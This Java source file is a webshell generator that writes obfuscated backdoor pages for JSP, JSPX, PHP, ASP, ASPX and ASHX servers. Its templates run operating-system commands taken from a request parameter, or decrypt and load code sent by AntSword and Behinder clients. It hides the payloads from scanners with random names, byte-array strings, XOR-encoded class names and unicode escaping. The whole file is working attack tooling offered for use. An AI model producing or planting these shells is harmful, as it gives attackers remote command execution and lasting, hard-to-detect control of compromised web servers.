package sample;

import java.io.*;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import static Util.RandomUtil.generateByRandom;
import static Util.UnicodeUtil.encodeString;
/**
 * @author cseroad
 */
public class Webshell_Generate {
    String jsp_lable_left = "<% ";
    String jsp_lable_right = " %>";
    String jsp_lable_left_1 = "<%!";
    String jspx_xml_header = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n";
    String jspx_xml_footer = "</hi>";
    String jspx_xml_left_script = "<hi:scriptlet>\n";
    String jspx_xml_right_script = "</hi:scriptlet>\n";
    String jspx_xml_left_declaration = "<hi:declaration> \n";
    String jspx_xml_right_declaration = "</hi:declaration> \n";

    String str1 = "A" + generateByRandom(4);
    String str2 = "B" + generateByRandom(5);
    String str3 = "C" + generateByRandom(3);
    String str4 = "D" + generateByRandom(8);
    String str5 = "E" + generateByRandom(7);
    String str6 = "F" + generateByRandom(5);
    String str7 = "G" + generateByRandom(7);
    String str8 = "H" + generateByRandom(4);
    String str9 = "I" + generateByRandom(6);
    String str10 = "L" + generateByRandom(5);
    String str11 = "Q" + generateByRandom(3);
    String str12 = "K" + generateByRandom(6);
    String str13 = "Z" + generateByRandom(9);
    String replaceAll = "";
    String str_code = "";
    String str_code_1 = "";
    String str_code_2 = "";
    String str_code_3 = "";
    String str_code_4 = "";
    String unicode_code = "//\\uuu000a";


    public void jsp_webshell(String type, String pass, String filepath,Boolean unicode ) {
        try {
            if ("cmd".equals(type)) {
                str_code = " String " + str1 + " = request.getParameter(\"" + pass + "\");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){pb = new ProcessBuilder(new /*" + str13 + "*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), " + str1 + ");}else{pb = new ProcessBuilder/*" + str13 + "*/(new/*" + str13 + "*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), " + str1 + ");}if (" + str1 + " != null) {Process process = pb.start();java.util.Scanner "+str5+" = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");String op=\"\";op = "+str5+".hasNext() ? "+str5+".next() : op;"+str5+".close();out.print(op);}else {response.sendError(404);}";
                replaceAll = jsp_lable_left+str_code+jsp_lable_right;
            }
            if ("cmd_reflect".equals(type)) {
                str_code = " Class<?> "+str3+" = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method "+str5+" = "+str3+".getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object "+str7+" = "+str5+".invoke( "+str3+".getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter(\""+pass+"\")});java.lang.reflect.Method "+str11+" = "+str7+".getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));"+str11+".setAccessible(true);java.util.Scanner s = new java.util.Scanner((java.io.InputStream) "+str11+".invoke("+str7+", new Object[]{})).useDelimiter(\"\\\\A\");String result = s.hasNext() ? s.next() : \"\";out.print(\"<pre>\");out.print(result);out.print(\"</pre>\");";
                replaceAll = jsp_lable_left+str_code+jsp_lable_right;
            }
            if ("AntSword".equals(type)) {
                str_code = " String " + str8 + " = request.getParameter(\"" + pass + "\");if (" + str8 + " != null) { class " + str5 + " extends/*" + str13 + "*/ClassLoader { " + str5 + "(ClassLoader " + str10 + ") { super(" + str10 + "); } public Class " + str8 + "(byte[] b) { return super.defineClass(b, 0, b.length);}}int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}Class " + str1 + " = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});byte[] bytes = (byte[]) " + str1 + ".getMethod(k, String.class).invoke(" + str1 + ".newInstance(), " + str8 + ");Class aClass = new " + str5 + "(Thread.currentThread().getContextClassLoader())." + str8 + "(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {response.sendError(404);}";
                replaceAll = jsp_lable_left+str_code+jsp_lable_right;
            }
            if ("Behinder".equals(type)) {
                String pass_md5 = getmd5(pass);
                str_code_1 = " public byte[] " + str1 + "(String Strings,String k) { try {javax.crypto.Cipher " + str2 + " = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");" + str2 + ".init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", String.class).invoke(Class.forName(ccstr).newInstance(), Strings);byte[] result = (byte[]) " + str2 + ".getClass()./*" + str13 + "*/getDeclaredMethod/*" + str13 + "*/(\"doFinal\", new Class[]{byte[].class}).invoke("+str2+",new Object[]{bytes});return result;} catch (Exception e) {e.printStackTrace();return null;} }";
                str_code_2 = " try {  String " + str12 + " = \"" + pass_md5 +"\";  session.putValue(\"u\", " + str12 + ");  byte[] " + str9 + " = " + str1 + " (request.getReader().readLine()," + str12 + ");  java./*" + str13 + "*/lang./*" + str13 + "*/reflect.Method " + str1 + " = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*"+ str13 +"*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  " + str1 + ".setAccessible(true);  Class i = (Class)" + str1 + ".invoke(Thread.currentThread()./*" + str13 + "*/getContextClassLoader(), " + str9 + " , 0, " + str9 + ".length);  Object " + str11 +" = i./*" + str13 + "*/newInstance();  "+ str11 +".equals(pageContext); } catch (Exception e) {out.print(e);}";
                replaceAll = jsp_lable_left_1+str_code_1+jsp_lable_right+jsp_lable_left+str_code_2+jsp_lable_right;
            }
            if ("Godzilla".equals(type)) {
                String pass_md5 = getmd5(pass);
                System.out.println("未实现");
                replaceAll = "";
            }
            if(unicode == true){
                String unicde_str = encodeString(str_code);
                replaceAll = jsp_lable_left+unicode_code+unicde_str+jsp_lable_right;
            }
            if(unicode == true && "Behinder".equals(type)){
                String unicde_str1 = encodeString(str_code_1);
                String unicde_str2 = encodeString(str_code_2);
                replaceAll = jsp_lable_left_1+unicode_code+unicde_str1+jsp_lable_right+jsp_lable_left+unicde_str2+jsp_lable_right;
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException | NoSuchAlgorithmException e){
            e.printStackTrace();
        }

    }

    public void jspx_webshell(String type, String pass, String filepath,Boolean unicode ) {
        try {
            if ("cmd".equals(type)) {
                str_code = " String " + str1 + " = request.getParameter(\"" + pass + "\");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){pb = new ProcessBuilder(new /*" + str13 + "*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), " + str1 + ");}else{pb = new ProcessBuilder/*" + str13 + "*/(new/*" + str13 + "*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), " + str1 + ");}if (" + str1 + " != null) {Process process = pb.start();java.util.Scanner "+str5+" = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");String op=\"\";op = "+str5+".hasNext() ? "+str5+".next() : op;"+str5+".close();out.print(op);}else {response.sendError(404);}";
                replaceAll = jspx_xml_header+jspx_xml_left_script+str_code+jspx_xml_right_script+jspx_xml_footer;
            }
            if ("cmd_reflect".equals(type)) {
                str_code = " Class<?> "+str3+" = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method "+str5+" = "+str3+".getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object "+str7+" = "+str5+".invoke( "+str3+".getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter(\""+pass+"\")});java.lang.reflect.Method "+str11+" = "+str7+".getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));"+str11+".setAccessible(true);java.util.Scanner s = new java.util.Scanner((java.io.InputStream) "+str11+".invoke("+str7+", new Object[]{})).useDelimiter(\"\\\\A\");String result = s.hasNext() ? s.next() : \"\";out.print(\"<pre>\");out.print(result);out.print(\"</pre>\");";
                replaceAll = jspx_xml_header+jspx_xml_left_script+str_code+jspx_xml_right_script+jspx_xml_footer;
            }
            if ("AntSword".equals(type)) {
                str_code = " String " + str8 + " = request.getParameter(\"" + pass + "\");if (" + str8 + " != null) { class " + str5 + " extends/*" + str13 + "*/ClassLoader { " + str5 + "(ClassLoader " + str10 + ") { super(" + str10 + "); } public Class " + str8 + "(byte[] b) { return super.defineClass(b, 0, b.length);}}int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";for (int i = 0; i &lt; aa.length; i++) {aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}Class " + str1 + " = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});byte[] bytes = (byte[]) " + str1 + ".getMethod(k, String.class).invoke(" + str1 + ".newInstance(), " + str8 + ");Class aClass = new " + str5 + "(Thread.currentThread().getContextClassLoader())." + str8 + "(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {response.sendError(404);}";
                replaceAll = jspx_xml_header+jspx_xml_left_script+str_code+jspx_xml_right_script+jspx_xml_footer;
            }
            if ("Behinder".equals(type)) {
                String pass_md5 = getmd5(pass);
                str_code_1 = " public byte[] " + str1 + "(String Strings,String k) { try {javax.crypto.Cipher " + str2 + " = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");" + str2 + ".init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i &lt; aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", String.class).invoke(Class.forName(ccstr).newInstance(), Strings);byte[] result = (byte[]) " + str2 + ".getClass()./*" + str13 + "*/getDeclaredMethod/*" + str13 + "*/(\"doFinal\", new Class[]{byte[].class}).invoke("+str2+",new Object[]{bytes});return result;} catch (Exception e) {e.printStackTrace();return null;} }";
                str_code_2 = " try {  String " + str12 + " = \"" + pass_md5 +"\";  session.putValue(\"u\", " + str12 + ");  byte[] " + str9 + " = " + str1 + " (request.getReader().readLine()," + str12 + ");  java./*" + str13 + "*/lang./*" + str13 + "*/reflect.Method " + str1 + " = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*"+ str13 +"*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  " + str1 + ".setAccessible(true);  Class i = (Class)" + str1 + ".invoke(Thread.currentThread()./*" + str13 + "*/getContextClassLoader(), " + str9 + " , 0, " + str9 + ".length);  Object " + str11 +" = i./*" + str13 + "*/newInstance();  "+ str11 +".equals(pageContext); } catch (Exception e) {out.print(e);}";
                replaceAll = jspx_xml_header+jspx_xml_left_declaration+str_code_1+jspx_xml_right_declaration+jspx_xml_left_script+str_code_2+jspx_xml_right_script+jspx_xml_footer;

            }
            if ("Godzilla".equals(type)) {
                String pass_md5 = getmd5(pass);
                System.out.println("未实现");
                replaceAll = "";
            }
            if(unicode == true){
                String unicde_str = encodeString(str_code);
                replaceAll = jspx_xml_header+jspx_xml_left_script+unicode_code+unicde_str+jspx_xml_right_script+jspx_xml_footer;
            }
            if(unicode == true &&  "AntSword".equals(type)){
                str_code_1 = " String " + str8 + " = request.getParameter(\"" + pass + "\");if (" + str8 + " != null) { class " + str5 + " extends/*" + str13 + "*/ClassLoader { " + str5 + "(ClassLoader " + str10 + ") { super(" + str10 + "); } public Class " + str8 + "(byte[] b) { return super.defineClass(b, 0, b.length);}}int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";";
                str_code_2 = "for (int i = 0; i &lt; aa.length; i++) ";
                str_code_3 = "{aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}Class " + str1 + " = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});byte[] bytes = (byte[]) " + str1 + ".getMethod(k, String.class).invoke(" + str1 + ".newInstance(), " + str8 + ");Class aClass = new " + str5 + "(Thread.currentThread().getContextClassLoader())." + str8 + "(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {response.sendError(404);}";
                String unicde_str1 = encodeString(str_code_1);
                String unicde_str3 = encodeString(str_code_3);
                replaceAll = jspx_xml_header+jspx_xml_left_script+unicode_code+unicde_str1+str_code_2+unicode_code+unicde_str3+jspx_xml_right_script+jspx_xml_footer;
            }
            if(unicode == true &&  "Behinder".equals(type)){
                String pass_md5 = getmd5(pass);
                str_code_1 = " public byte[] " + str1 + "(String Strings,String k) { try {javax.crypto.Cipher " + str2 + " = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");" + str2 + ".init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";";
                str_code_2 = "for (int i = 0; i &lt; aa.length; i++) ";
                str_code_3 = "{ aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", String.class).invoke(Class.forName(ccstr).newInstance(), Strings);byte[] result = (byte[]) " + str2 + ".getClass()./*" + str13 + "*/getDeclaredMethod/*" + str13 + "*/(\"doFinal\", new Class[]{byte[].class}).invoke("+str2+",new Object[]{bytes});return result;} catch (Exception e) {e.printStackTrace();return null;} }";
                str_code_4 = " try {  String " + str12 + " = \"" + pass_md5 +"\";  session.putValue(\"u\", " + str12 + ");  byte[] " + str9 + " = " + str1 + " (request.getReader().readLine()," + str12 + ");  java./*" + str13 + "*/lang./*" + str13 + "*/reflect.Method " + str1 + " = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*"+ str13 +"*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  " + str1 + ".setAccessible(true);  Class i = (Class)" + str1 + ".invoke(Thread.currentThread()./*" + str13 + "*/getContextClassLoader(), " + str9 + " , 0, " + str9 + ".length);  Object " + str11 +" = i./*" + str13 + "*/newInstance();  "+ str11 +".equals(pageContext); } catch (Exception e) {out.print(e);}";
                String unicde_str1 = encodeString(str_code_1);
                String unicde_str3 = encodeString(str_code_3);
                String unicde_str4 = encodeString(str_code_4);
                replaceAll = jspx_xml_header+jspx_xml_left_declaration+unicode_code+unicde_str1+str_code_2+unicode_code+unicde_str3+jspx_xml_right_declaration+jspx_xml_left_script+unicode_code+unicde_str4+jspx_xml_right_script+jspx_xml_footer;
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException | NoSuchAlgorithmException e){
            e.printStackTrace();
        }

    }


    public void php_webshell(String type, String pass,String filepath) {
        try {
            if ("AntSword".equals(type)) {
                replaceAll = "<?php class "+str7+" { public function __construct($"+str8+"){ @eval(\"/*"+str13+"*/\".$"+str8+".\"\"); }}new "+str7+"($_REQUEST['"+pass+"']);?>";
            }
            if ("AntSword_base64".equals(type)) {
                replaceAll = "<?php /*"+str6+"*/preg_replace('<.*>e','\\0',$_REQUEST['"+pass+"']);?>";
            }
            if ("Behinder".equals(type)) {
                String pass_md5 = getmd5(pass);
                replaceAll = ("<?php @error_reporting(0);session_start();$key=\""+ pass_md5 +"\";$_SESSION['k']=$key;$f='file'.'_get'.'_contents';$p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);$"+str8+"=$f($p);if(!extension_loaded('openssl')){ $t=preg_filter('/\\s+/','','base 64 _ deco de');$"+str8+"=$t($"+str8+".\"\");for($i=0;$i<strlen($"+str8+");$i++) { $new_key = $key[$i+1&15];$"+str8+"[$i] = $"+str8+"[$i] ^ $new_key;}\t}else{ $"+str8+"=openssl_decrypt($"+str8+", \"AES128\", $key);}$arr=explode('|',$"+str8+");$func=$arr[0];$params=$arr[1];class "+str7+"{ public function __invoke($p) {@eval(\"/*"+str13+"*/\".$p.\"\");}}@call_user_func/*"+str13+"*/(new "+str7+"(),$params);?>");
            }
            if ("Godzilla".equals(type)) {
                String pass_md5 = getmd5(pass);
                System.out.println("未实现");
                replaceAll = "";
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException | NoSuchAlgorithmException e){
            e.printStackTrace();
        }
    }

    public void asp_webshell(String type, String pass,String filepath) {
        try {
            if ("AntSword".equals(type)) {
                replaceAll="<% \n" +
                        "<!--" +
                        "\n" +
                        "Class "+str3+"\n" +
                        "    public property let SXEWH("+str4+")\n" +
                        "    exeCute("+str4+")REM IXMQD)\n" +
                        "    end property\n" +
                        "End Class\n" +
                        "\n" +
                        "Set a= New "+str3+"\n" +
                        "a.SXEWH= request(\""+pass+"\")\n" +
                        "-->\n" +
                        "%>";
            }
            if ("Behinder".equals(type)) {
                String pass_md5 = getmd5(pass);
                replaceAll="<% \n" +
                        "<!-- \n" +
                        "Response.CharSet = \"UTF-8\" \n" +
                        ""+str2+"=\""+pass_md5+"\"  \n" +
                        "Session(\"k\")="+str2+" \n" +
                        ""+str3+"=Request.TotalBytes \n" +
                        "QNGSU=Request.BinaryRead("+str3+") \n" +
                        "For i=1 To "+str3+" \n" +
                        ""+str10+"=ascb(midb(QNGSU,i,1)) Xor Asc(Mid("+str2+",(i and 15)+1,1))  \n" +
                        "VSRBJ=VSRBJ&Chr("+str10+") \n" +
                        "Next \n" +
                        "execute(VSRBJ)REM ) \n" +
                        "-->\n" +
                        "%>";
            }
            if ("Godzilla".equals(type)) {
                String pass_md5 = getmd5(pass);
                System.out.println("未实现");
                replaceAll = "";
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException | NoSuchAlgorithmException e){
            e.printStackTrace();
        }
    }
    public void aspx_webshell(String type, String pass,String filepath) {
        try {
            if ("AntSword".equals(type)) {
                replaceAll="<%@Page Language=JS%><% function "+str5+"(){var GEPH=\"unsa\",YACK=\"fe\",EZKI=GEPH+YACK;return EZKI;}var PAY:String=Request[\""+pass+"\"];eval(PAY,"+str5+"());%>";
            }
            if ("Behinder".equals(type)) {
                String pass_md5 = getmd5(pass);
                replaceAll="<%@Import Namespace=\"System.Reflection\"%><%Session.@Add(\"key\",\""+pass_md5+"\"); byte[] key = Encoding.Default.GetBytes(Session[0] + \"\"),content = Request.BinaryRead(Request.ContentLength);byte[] decryptContent = new @System.Security.Cryptography.RijndaelManaged()./*"+str13+"*/@CreateDecryptor(key, key)/*"+str13+"*/.TransformFinalBlock(content, 0, content.Length);Assembly.Load(decryptContent)/*"+str13+"*/.@CreateInstance(\"U\")/**/.Equals(/*"+str13+"*/this)/*"+str13+"*/;%><%@ Page Language=\"CSHARP\" %>\n";
            }
            if ("Godzilla".equals(type)) {
                String pass_md5 = getmd5(pass);
                System.out.println("未实现");
                replaceAll = "";
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException | NoSuchAlgorithmException e){
            e.printStackTrace();
        }
    }

    public  void other_webshell(String type, String pass,String filepath) {
        try {
            if ("ashx_cmd".equals(type)) {
                replaceAll="<%@ WebHandler Language=\"CSHARP\" Class=\"Handler3\" %>using System;using System.Collections.Generic; using System.Diagnostics;using System.Web;public class Handler3 : IHttpHandler { public void ProcessRequest (HttpContext context) { string "+str2+" = context.Request[\""+pass+"\"];System.Diagnostics.Process p = new System.Diagnostics.Process();/*"+str13+"*/p.StartInfo./*"+str13+"*/FileName = \"cmd.exe\";\t/*"+str13+"*/p.StartInfo.UseShellExecute = false;/*"+str13+"*/p.StartInfo.RedirectStandardInput = true;p.StartInfo.RedirectStandardOutput = true;p.StartInfo.RedirectStandardError = true;p.StartInfo.CreateNoWindow = true;p.Start();p.StandardInput.WriteLine("+str2+");p.StandardInput.Close();context.Response.Write(p.StandardOutput.ReadToEnd());context.Response.End();}public bool IsReusable { get { return false;}}}";
            }
            if ("asmx_cmd".equals(type)) {
                replaceAll="";
            }
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(filepath)));
            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        }catch (IOException  e){
            e.printStackTrace();
        }
    }

    public String getmd5(String pass) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(pass.getBytes("UTF-8"));
        byte[]  r = md.digest();
        BigInteger a = new BigInteger(1,r);
        String format = String.format("%032x", a);
        String substring = format.substring(0, 16);
        return substring;
    }

}
